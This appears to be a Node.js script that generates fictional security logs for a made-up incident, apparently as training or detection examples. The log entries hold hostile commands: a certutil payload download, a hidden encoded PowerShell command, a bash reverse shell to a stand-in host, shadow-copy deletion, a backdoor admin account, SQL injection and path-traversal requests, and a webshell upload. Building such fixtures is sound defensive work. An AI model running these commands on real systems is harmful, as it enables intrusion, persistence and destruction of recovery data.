// Deterministic fictional incident: external brute force -> RDP -> persistence -> log clearing,
// with a web-side SQLi probe. All hosts, users and addresses are made up (RFC 5737 / 1918 ranges).
import { writeFileSync, mkdirSync } from "node:fs";
const out = new URL("../examples/", import.meta.url).pathname;
mkdirSync(out, { recursive: true });

const base = Date.UTC(2026, 2, 14, 2, 10, 0);
const t = (min, sec = 0) => new Date(base + min * 60_000 + sec * 1000).toISOString();
const win = [];
let rid = 1000;
const add = (min, sec, id, host, data, msg = "") => win.push({ Id: id, TimeCreated: t(min, sec), MachineName: host, RecordId: rid++, EventData: data, Message: msg });

const ATT = "203.0.113.45";
for (let i = 0; i < 14; i++) add(0, i * 9, 4625, "WS-FIN-07", { TargetUserName: i % 3 ? "administrator" : "jlopez", IpAddress: ATT, LogonType: "10" });
add(2, 20, 4624, "WS-FIN-07", { TargetUserName: "jlopez", IpAddress: ATT, LogonType: "10" });
add(4, 5, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", NewProcessName: "C:\\Windows\\System32\\whoami.exe", CommandLine: "whoami /all" });
add(4, 30, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", CommandLine: "net user" });
add(4, 55, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", CommandLine: "net localgroup administrators" });
add(5, 20, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", CommandLine: "systeminfo" });
add(7, 0, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", CommandLine: "certutil -urlcache -f http://198.51.100.9/upd.exe C:\\Users\\Public\\upd.exe" });
add(8, 10, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", CommandLine: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" });
add(9, 40, 7045, "WS-FIN-07", { ServiceName: "WinUpdSvc", ImagePath: "C:\\Users\\Public\\upd.exe" });
add(10, 15, 4698, "WS-FIN-07", { SubjectUserName: "jlopez", TaskName: "\\Microsoft\\Windows\\UpdateCheck" });
add(11, 30, 4720, "WS-FIN-07", { TargetUserName: "support$admin", SubjectUserName: "jlopez" });
add(11, 50, 4732, "WS-FIN-07", { GroupName: "Administrators", MemberName: "support$admin", SubjectUserName: "jlopez" });
add(13, 0, 4688, "WS-FIN-07", { SubjectUserName: "jlopez", CommandLine: "vssadmin delete shadows /all /quiet" });
add(14, 5, 1102, "WS-FIN-07", { SubjectUserName: "support$admin" });
// background noise
for (let i = 0; i < 40; i++) add(-120 + i * 6, 3 * i, 4624, i % 2 ? "WS-FIN-07" : "SRV-DC-01", { TargetUserName: i % 2 ? "jlopez" : "svc-backup", IpAddress: "10.20.0." + (10 + (i % 5)), LogonType: i % 2 ? "2" : "3" });
// kerberoasting on the DC from another workstation
for (let i = 0; i < 7; i++) add(30, i * 4, 4769, "SRV-DC-01", { TargetUserName: "mruiz", ServiceName: ["MSSQLSvc", "HTTP", "CIFS", "svc-sql", "svc-web", "svc-ftp", "svc-app"][i] + (i < 3 ? "/db01" : ""), TicketEncryptionType: "0x17" });
win.sort((a, b) => Date.parse(a.TimeCreated) - Date.parse(b.TimeCreated));
writeFileSync(out + "win-security.jsonl", win.map((e) => JSON.stringify(e)).join("\n") + "\n");

// Linux: spray then success then useradd
const pad = (n) => String(n).padStart(2, "0");
const sys = (min, sec, msg) => {
  const d = new Date(base + min * 60_000 + sec * 1000);
  return `${["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"][d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, " ")} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} web01 ${msg}`;
};
const lx = [];
const users = ["root", "admin", "ubuntu", "deploy", "postgres", "git", "test", "oracle"];
users.forEach((u, i) => lx.push(sys(40, i * 6, `sshd[2211]: Failed password for ${u === "root" ? "" : "invalid user "}${u} from 198.51.100.77 port ${40000 + i} ssh2`)));
lx.push(sys(41, 5, "sshd[2290]: Accepted password for deploy from 198.51.100.77 port 40101 ssh2"));
lx.push(sys(41, 40, "sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id"));
lx.push(sys(42, 10, "sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.77/4444 0>&1'"));
lx.push(sys(43, 0, "useradd[2340]: new user: name=sysupd, UID=1002, GID=1002, home=/home/sysupd, shell=/bin/bash"));
lx.push(sys(43, 20, "usermod[2345]: add 'sysupd' to group 'sudo'"));
lx.push(sys(10, 0, "sshd[1100]: Accepted publickey for ops from 10.20.0.5 port 50022 ssh2"));
lx.sort();
writeFileSync(out + "auth.log", lx.join("\n") + "\n");

// Web: scan then SQLi then a webshell
const web = [];
const w = (min, sec, ip, req, status, ua = "Mozilla/5.0") => {
  const d = new Date(base + min * 60_000 + sec * 1000);
  const mon = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"][d.getUTCMonth()];
  web.push(`${ip} - - [${pad(d.getUTCDate())}/${mon}/${d.getUTCFullYear()}:${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} +0000] "${req} HTTP/1.1" ${status} 512 "-" "${ua}"`);
};
for (let i = 0; i < 30; i++) w(50, i * 3, "192.0.2.88", `GET /${["admin","backup","wp-login.php",".git/config","phpmyadmin","old","test","db.sql"][i % 8]}${i} `.trimEnd(), 404, "nikto/2.5");
w(52, 0, "192.0.2.88", "GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", 200);
w(52, 30, "192.0.2.88", "GET /download.php?f=../../../../etc/passwd", 200);
w(53, 10, "192.0.2.88", "POST /uploads/c99.php", 200);
for (let i = 0; i < 10; i++) w(-60 + i * 5, 0, "10.20.0.30", "GET /index.html", 200);
web.sort((a, b) => a.localeCompare(b));
writeFileSync(out + "access.log", web.join("\n") + "\n");
console.log("examples written");
